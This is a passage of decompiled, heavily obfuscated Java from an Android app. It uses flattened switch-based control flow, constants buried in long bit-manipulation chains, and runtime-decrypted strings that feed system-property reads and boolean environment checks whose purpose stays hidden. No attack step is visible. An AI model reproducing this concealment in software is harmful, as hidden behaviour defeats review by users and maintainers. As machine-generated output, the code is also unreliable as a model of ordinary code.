                        bArr7[4] = 118;
                        bArr7[5] = -97;
                        long j198 = -6098496;
                        long j199 = -6098490;
                        long j200 = ((((((((j198 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j198 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j198 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j198 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (((((((((j199 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j199 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j199 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j199 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                        long j201 = (j200 >>> 48) & 21845;
                        long j202 = (j201 | (j201 >>> 1)) & 858993459;
                        long j203 = (j202 | (j202 >>> 2)) & 252645135;
                        long j204 = (j200 >>> 32) & 21845;
                        long j205 = (j204 | (j204 >>> 1)) & 858993459;
                        long j206 = (j205 | (j205 >>> 2)) & 252645135;
                        long j207 = (((j203 | (j203 >>> 4)) & 16711935) << 24) | (((j206 | (j206 >>> 4)) & 16711935) << 16);
                        long j208 = (j200 >>> 16) & 21845;
                        long j209 = (j208 | (j208 >>> 1)) & 858993459;
                        long j210 = (j209 | (j209 >>> 2)) & 252645135;
                        long j211 = j200 & 21845;
                        long j212 = ((j211 >>> 1) | j211) & 858993459;
                        long j213 = (j212 | (j212 >>> 2)) & 252645135;
                        bArr7[(int) ((((j213 >>> 4) | j213) & 16711935) | ((((j210 | (j210 >>> 4)) & 16711935) << 8) + j207))] = 110;
                        bArr7[7] = -41;
                        bArr7[8] = -76;
                        bArr7[9] = -122;
                        B(bArr7, new byte[]{39, -16, -16, 25, 19, -19, 29, -66, -37, -24});
                        e4 = System.getProperty(new String(bArr7, StandardCharsets.UTF_8).intern());
                    } catch (Exception e6) {
                        e4 = e6;
                        c4 = 47630;
                    }
                    c4 = !TextUtils.isEmpty(e4) ? (char) 24339 : (char) 57432;
                case 50378:
                    return false;
                default:
                    c4 = 16789;
            }
        }
    }

    public final boolean W() {
        String str = null;
        char c4 = 43347;
        Integer num = null;
        char c5 = 43347;
        while (true) {
            if (c5 == c4) {
                long j2 = 118490240;
                long j3 = 0;
                long b4 = c3.b((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                long j4 = (b4 >>> 48) & 43690;
                long j5 = ((j4 >>> 2) | (j4 >>> 1)) & 858993459;
                long j6 = (j5 | (j5 >>> 2)) & 252645135;
                long j7 = (b4 >>> 32) & 43690;
                long j8 = ((j7 >>> 2) | (j7 >>> 1)) & 858993459;
                long j9 = ((j8 >>> 2) | j8) & 252645135;
                long j10 = ((((j9 >>> 4) | j9) & 16711935) << 16) + (((j6 | (j6 >>> 4)) & 16711935) << 24);
                long j11 = (b4 >>> 16) & 43690;
                long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
                long j13 = ((j12 >>> 2) | j12) & 252645135;
                long j14 = b4 & 43690;
                long j15 = ((j14 >>> 2) | (j14 >>> 1)) & 858993459;
                long j16 = (j15 | (j15 >>> 2)) & 252645135;
                int i = 809525820 + ((int) (((j16 | (j16 >>> 4)) & 16711935) | ((((j13 >>> 4) | j13) & 16711935) << 8) | j10));
                long j17 = -928016065;
                long j18 = i;
                long j19 = (((((((((j17 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j17 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j17 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j17 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                long j20 = (j19 >>> 48) & 21845;
                long j21 = (j20 | (j20 >>> 1)) & 858993459;
                long j22 = (j21 | (j21 >>> 2)) & 252645135;
                long j23 = (j19 >>> 32) & 21845;
                long j24 = ((j23 >>> 1) | j23) & 858993459;
                long j25 = ((j24 >>> 2) | j24) & 252645135;
                long j26 = ((((j25 >>> 4) | j25) & 16711935) << 16) + (((j22 | (j22 >>> 4)) & 16711935) << 24);
                long j27 = (j19 >>> 16) & 21845;
                long j28 = ((j27 >>> 1) | j27) & 858993459;
                long j29 = ((j28 >>> 2) | j28) & 252645135;
                long j30 = j19 & 21845;
                long j31 = (j30 | (j30 >>> 1)) & 858993459;
                long j32 = (j31 | (j31 >>> 2)) & 252645135;
                byte[] bArr = {-14, -100, -30, -58, 41, 87, 20, -110, -30, -29, -102, (int) (((j32 | (j32 >>> 4)) & 16711935) + ((((j29 >>> 4) | j29) & 16711935) << 8) + j26), -111, 36, -59, 92};
                y(bArr, new byte[]{106, 41, 123, -55, 41, 100, 91, -43, 108, -73, -30, -58, -52, 123, -108, 65});
                str = new String(bArr, StandardCharsets.UTF_8).intern();
                Integer valueOf = Integer.valueOf(AbstractC0044j.b(str));
                c5 = valueOf.equals(1) ? (char) 61826 : (char) 43887;
                num = valueOf;
                c4 = 43347;
            } else {
                if (c5 == 61826) {
                    byte[] bArr2 = {90, 108, -35, 31, 3, -110, -23, -110, 73, -94, 54, 23, -113, 105, 40, -78, 3, 80, 71, 82, 5, -94, 93};
                    long j33 = 1678516504;
                    long j34 = -1;
                    long j35 = (((((((((j33 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j33 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j33 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j33 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j36 = (j35 >>> 48) & 43690;
                    long j37 = ((j36 >>> 2) | (j36 >>> 1)) & 858993459;
                    long j38 = ((j37 >>> 2) | j37) & 252645135;
                    long j39 = (j35 >>> 32) & 43690;
                    long j40 = ((j39 >>> 2) | (j39 >>> 1)) & 858993459;
                    long j41 = ((j40 >>> 2) | j40) & 252645135;
                    long j42 = ((((j41 >>> 4) | j41) & 16711935) << 16) + ((((j38 >>> 4) | j38) & 16711935) << 24);
                    long j43 = (j35 >>> 16) & 43690;
                    long j44 = ((j43 >>> 2) | (j43 >>> 1)) & 858993459;
                    long j45 = ((j44 >>> 2) | j44) & 252645135;
                    long j46 = j35 & 43690;
                    long j47 = ((j46 >>> 2) | (j46 >>> 1)) & 858993459;
                    long j48 = ((j47 >>> 2) | j47) & 252645135;
                    long j49 = 16827220;
                    long j50 = 0;
                    long j51 = (((((((((j49 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j49 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j49 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j49 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j50 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j50 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j50 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j50 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j52 = (j51 >>> 48) & 43690;
                    long j53 = ((j52 >>> 2) | (j52 >>> 1)) & 858993459;
                    long j54 = ((j53 >>> 2) | j53) & 252645135;
                    long j55 = (j51 >>> 32) & 43690;
                    long j56 = ((j55 >>> 2) | (j55 >>> 1)) & 858993459;
                    long j57 = ((j56 >>> 2) | j56) & 252645135;
                    long j58 = ((((j57 >>> 4) | j57) & 16711935) << 16) + ((((j54 >>> 4) | j54) & 16711935) << 24);
                    long j59 = (j51 >>> 16) & 43690;
                    long j60 = ((j59 >>> 2) | (j59 >>> 1)) & 858993459;
                    long j61 = ((j60 >>> 2) | j60) & 252645135;
                    long j62 = j51 & 43690;
                    long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
                    long j64 = ((j63 >>> 2) | j63) & 252645135;
                    int i3 = ((int) ((((j64 >>> 4) | j64) & 16711935) | ((((j61 >>> 4) | j61) & 16711935) << 8) | j58)) | 1342227284;
                    y(bArr2, new byte[]{28, 79, 120, (((int) ((((j48 >>> 4) | j48) & 16711935) | (((((j45 >>> 4) | j45) & 16711935) << 8) + j42))) + 26232837) ^ 1704749410, 89, 22, 119, 24, 2, 0, 68, Byte.MIN_VALUE, -45, 75, 70, -28, 47, 81, 28, 76, 105, (i3 - 1342227278) - (((553723050 + i3) & (-1895950328)) * 2), 50});
                    Charset charset = StandardCharsets.UTF_8;
                    String intern = new String(bArr2, charset).intern();
                    StringBuilder h2 = e0.a.h(str);
                    byte[] bArr3 = {-64, -122, -114};
                    y(bArr3, new byte[]{-32, -68, -82, -41, -52, 53, 105, -9});
                    h2.append(new String(bArr3, charset).intern());
                    h2.append(num);
                    t(intern, h2.toString());
                    return true;
                }
                if (c5 == 43887) {
                    return false;
                }
                c4 = 43347;
                c5 = 43347;
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0060. Please report as an issue. */
    public final boolean X(Context context) {
        Object obj;
        Iterator it;
        ArrayList arrayList;
        StringBuilder sb;
        char c4;
        Object e4 = null;
        C0087u c0087u = null;
        StringBuilder sb2 = null;
        ArrayList arrayList2 = null;
        StringBuilder sb3 = null;
        String str = null;
        char c5 = 65504;
        Iterator it2 = null;
        while (true) {
            switch (c5) {
                case 3032:
                    obj = e4;
                    it = it2;
                    arrayList = arrayList2;
                    sb = sb3;
                    c4 = it.hasNext() ? (char) 65118 : (char) 3030;
                    c5 = c4;
                    sb3 = sb;
                    arrayList2 = arrayList;
                    it2 = it;
                    e4 = obj;
                case 55066:
                    obj = e4;
                    c5 = 3930;
                    e4 = obj;
                case 21183:
                    obj = e4;
                    it = it2;
                    sb2 = (StringBuilder) obj;
                    long j2 = -991220111;
                    long j3 = -1;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j7 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j8 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j7 + j6 + (j5 | j4) + 6148914691236517205L;
                    long j9 = (j8 >>> 48) & 43690;
                    long j10 = ((j9 >>> 2) | (j9 >>> 1)) & 858993459;
                    long j11 = ((j10 >>> 2) | j10) & 252645135;
                    long j12 = (j8 >>> 32) & 43690;
                    long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                    long j14 = ((j13 >>> 2) | j13) & 252645135;
                    long j15 = ((((j14 >>> 4) | j14) & 16711935) << 16) + ((((j11 >>> 4) | j11) & 16711935) << 24);
                    long j16 = (j8 >>> 16) & 43690;
                    long j17 = ((j16 >>> 2) | (j16 >>> 1)) & 858993459;
                    long j18 = ((j17 >>> 2) | j17) & 252645135;
                    long j19 = j8 & 43690;
                    long j20 = ((j19 >>> 2) | (j19 >>> 1)) & 858993459;
                    long j21 = ((j20 >>> 2) | j20) & 252645135;
                    byte[] bArr = {-15, ((((int) ((((j21 >>> 4) | j21) & 16711935) + (((((j18 >>> 4) | j18) & 16711935) << 8) + j15))) & 277783058) + 1213206784) ^ 1490989891, -98, -98, -19, -120, -81, 124};
                    byte[] bArr2 = new byte[8];
                    bArr2[0] = 36;
                    arrayList = arrayList2;
                    sb = sb3;
                    long j22 = 2097168;
                    long j23 = 0;
                    long j24 = (((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j25 = (((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j26 = (((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j27 = j26 + j25 + j24;
                    long j28 = (((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j29 = (((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j28 + j27;
                    long j30 = (j29 >>> 48) & 43690;
                    long j31 = ((j30 >>> 2) | (j30 >>> 1)) & 858993459;
                    long j32 = ((j31 >>> 2) | j31) & 252645135;
                    long j33 = (j29 >>> 32) & 43690;
                    long j34 = ((j33 >>> 2) | (j33 >>> 1)) & 858993459;
                    long j35 = ((j34 >>> 2) | j34) & 252645135;
                    long j36 = ((((j35 >>> 4) | j35) & 16711935) << 16) + ((((j32 >>> 4) | j32) & 16711935) << 24);
                    long j37 = (j29 >>> 16) & 43690;
                    long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
                    long j39 = ((j38 >>> 2) | j38) & 252645135;
                    long j40 = j29 & 43690;
                    long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
                    long j42 = ((j41 >>> 2) | j41) & 252645135;
                    int i = 117965872 + (((int) ((((j42 >>> 4) | j42) & 16711935) + (((((j39 >>> 4) | j39) & 16711935) << 8) | j36))) | 270664457);
                    bArr2[1] = (i | 388630317) - (388630317 & i);
                    bArr2[2] = -104;
                    bArr2[3] = 43;
                    bArr2[4] = 83;
                    bArr2[5] = 29;
                    long j43 = (j7 | (j5 + j4 + j6)) + j28 + (j26 | j25 | j24);
                    long j44 = (j43 >>> 48) & 21845;
                    long j45 = ((j44 >>> 1) | j44) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    long j47 = (j43 >>> 32) & 21845;
                    long j48 = ((j47 >>> 1) | j47) & 858993459;
                    long j49 = ((j48 >>> 2) | j48) & 252645135;
                    long j50 = ((((j49 >>> 4) | j49) & 16711935) << 16) | ((((j46 >>> 4) | j46) & 16711935) << 24);
                    long j51 = (j43 >>> 16) & 21845;
                    long j52 = ((j51 >>> 1) | j51) & 858993459;
                    long j53 = ((j52 >>> 2) | j52) & 252645135;
                    long j54 = j43 & 21845;
                    long j55 = ((j54 >>> 1) | j54) & 858993459;
                    long j56 = ((j55 >>> 2) | j55) & 252645135;
                    int i3 = (int) (((((j53 >>> 4) | j53) & 16711935) << 8) | j50 | (((j56 >>> 4) | j56) & 16711935));
                    long j57 = -1721278007;
                    long j58 = i3;
                    long b4 = c3.b((((((((j57 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j57 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j57 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j57 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j58 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j58 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j58 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j58 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                    long j59 = (b4 >>> 48) & 43690;
                    long j60 = ((j59 >>> 2) | (j59 >>> 1)) & 858993459;
                    long j61 = ((j60 >>> 2) | j60) & 252645135;
                    long j62 = (b4 >>> 32) & 43690;
                    long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
                    long j64 = ((j63 >>> 2) | j63) & 252645135;
                    long j65 = ((((j64 >>> 4) | j64) & 16711935) << 16) | ((((j61 >>> 4) | j61) & 16711935) << 24);
                    long j66 = (b4 >>> 16) & 43690;
                    long j67 = ((j66 >>> 2) | (j66 >>> 1)) & 858993459;
                    long j68 = ((j67 >>> 2) | j67) & 252645135;
                    long j69 = b4 & 43690;
                    long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
                    long j71 = (j70 | (j70 >>> 2)) & 252645135;
                    int i4 = ((int) (((j71 | (j71 >>> 4)) & 16711935) + ((((j68 >>> 4) | j68) & 16711935) << 8) + j65)) & 23300105;
                    long j72 = 680002240;
                    long j73 = (((((((((j72 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j72 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j72 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j72 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j28 | j27) + 6148914691236517205L;
                    long j74 = (j73 >>> 48) & 43690;
                    long j75 = ((j74 >>> 2) | (j74 >>> 1)) & 858993459;
                    long j76 = ((j75 >>> 2) | j75) & 252645135;
                    long j77 = (j73 >>> 32) & 43690;
                    long j78 = ((j77 >>> 2) | (j77 >>> 1)) & 858993459;
                    long j79 = ((j78 >>> 2) | j78) & 252645135;
                    long j80 = ((((j79 >>> 4) | j79) & 16711935) << 16) | ((((j76 >>> 4) | j76) & 16711935) << 24);
                    long j81 = (j73 >>> 16) & 43690;
                    long j82 = ((j81 >>> 2) | (j81 >>> 1)) & 858993459;
                    long j83 = ((j82 >>> 2) | j82) & 252645135;
                    long j84 = j73 & 43690;
                    long j85 = ((j84 >>> 2) | (j84 >>> 1)) & 858993459;
                    long j86 = ((j85 >>> 2) | j85) & 252645135;
                    int i5 = i4 + ((int) ((((j86 >>> 4) | j86) & 16711935) + (((((j83 >>> 4) | j83) & 16711935) << 8) | j80)));
                    bArr2[E1.a(i5 | 703302351, 703302351, i5)] = 53;
                    bArr2[7] = -49;
                    k(bArr, bArr2);
                    sb2.append(new String(bArr, StandardCharsets.UTF_8).intern());
                    c4 = c0087u.f681c != null ? (char) 41909 : (char) 57007;
                    c5 = c4;
                    sb3 = sb;
                    arrayList2 = arrayList;
                    it2 = it;
                    e4 = obj;
                case 48399:
                    StringBuilder sb4 = (StringBuilder) e4;
                    byte[] bArr3 = {19, 110, -77, 103, 102, 19, 84};
                    byte[] bArr4 = new byte[8];
                    bArr4[0] = 19;
                    long j87 = 1111492100;
                    Object obj2 = e4;
                    long j88 = 0;
                    long b5 = c3.b((((((((j87 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j87 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j87 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j87 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j88 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j88 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j88 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j88 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), 6148914691236517205L);
                    long j89 = (b5 >>> 48) & 43690;
                    long j90 = ((j89 >>> 2) | (j89 >>> 1)) & 858993459;
                    long j91 = ((j90 >>> 2) | j90) & 252645135;
                    long j92 = (b5 >>> 32) & 43690;
                    long j93 = ((j92 >>> 2) | (j92 >>> 1)) & 858993459;
                    long j94 = ((j93 >>> 2) | j93) & 252645135;
                    long j95 = ((((j94 >>> 4) | j94) & 16711935) << 16) | ((((j91 >>> 4) | j91) & 16711935) << 24);
                    long j96 = (b5 >>> 16) & 43690;
                    long j97 = ((j96 >>> 2) | (j96 >>> 1)) & 858993459;
                    long j98 = ((j97 >>> 2) | j97) & 252645135;
                    long j99 = b5 & 43690;
                    long j100 = ((j99 >>> 2) | (j99 >>> 1)) & 858993459;
                    long j101 = (j100 | (j100 >>> 2)) & 252645135;
                    bArr4[(-764664084) ^ ((-1876156183) + ((int) (((j101 | (j101 >>> 4)) & 16711935) + (((((j98 >>> 4) | j98) & 16711935) << 8) + j95))))] = 105;
                    bArr4[2] = Byte.MAX_VALUE;
                    bArr4[3] = 3;
                    bArr4[4] = -115;
                    bArr4[5] = -85;
                    bArr4[6] = 100;
                    bArr4[7] = -75;
                    k(bArr3, bArr4);
                    sb4.append(new String(bArr3, StandardCharsets.UTF_8).intern());
                    sb4.append(c0087u.f680b);
                    it2 = it2;
                    e4 = obj2;
                case 40724:
                    return false;
                case 57007:
                    byte[] bArr5 = {73, 68, -127, -36, -91, -1, -86};
                    k(bArr5, new byte[]{14, -60, -120, -54, 111, 93, 5, -67});
                    str = new String(bArr5, StandardCharsets.UTF_8).intern();
                    sb3 = sb2;
                    c5 = 31798;
                case 34853:
                    e4 = new StringBuilder();
                    it2 = arrayList2.iterator();
                    c5 = 3032;
                case 3030:
                    long j102 = -1;
                    long j103 = 0;
                    long j104 = ((((((((j103 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((j103 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j103 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((((j103 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32);
                    long j105 = ((((((((j102 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j102 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((j102 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j102 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16)));
                    long j106 = j105 + j104;
                    long j107 = (j106 >>> 48) & 21845;
                    long j108 = (j107 | (j107 >>> 1)) & 858993459;
                    long j109 = (j108 | (j108 >>> 2)) & 252645135;
                    long j110 = (j106 >>> 32) & 21845;
                    long j111 = (j110 | (j110 >>> 1)) & 858993459;
                    long j112 = (j111 | (j111 >>> 2)) & 252645135;
                    long j113 = (((j112 | (j112 >>> 4)) & 16711935) << 16) + (((j109 | (j109 >>> 4)) & 16711935) << 24);
                    long j114 = (j106 >>> 16) & 21845;
                    long j115 = (j114 | (j114 >>> 1)) & 858993459;
                    long j116 = (j115 | (j115 >>> 2)) & 252645135;
                    long j117 = j106 & 21845;
                    long j118 = (j117 | (j117 >>> 1)) & 858993459;
                    long j119 = (j118 | (j118 >>> 2)) & 252645135;
                    int i6 = (((int) (((j119 | (j119 >>> 4)) & 16711935) + ((((j116 | (j116 >>> 4)) & 16711935) << 8) | j113))) | 398531932) & (-1602021312);
                    long j120 = -1037258073;
                    long j121 = 1037258070;
                    long j122 = (((((((((j120 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j120 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j120 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j120 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j121 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j121 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j121 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j121 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j123 = (j122 >>> 48) & 21845;
                    long j124 = (j123 | (j123 >>> 1)) & 858993459;
                    long j125 = (j124 | (j124 >>> 2)) & 252645135;
                    long j126 = (j122 >>> 32) & 21845;
                    long j127 = ((j126 >>> 1) | j126) & 858993459;
                    long j128 = ((j127 >>> 2) | j127) & 252645135;
                    long j129 = ((((j128 >>> 4) | j128) & 16711935) << 16) + (((j125 | (j125 >>> 4)) & 16711935) << 24);
                    long j130 = (j122 >>> 16) & 21845;
                    long j131 = ((j130 >>> 1) | j130) & 858993459;
                    long j132 = ((j131 >>> 2) | j131) & 252645135;
                    long j133 = j122 & 21845;
                    long j134 = (j133 | (j133 >>> 1)) & 858993459;
                    long j135 = (j134 | (j134 >>> 2)) & 252645135;
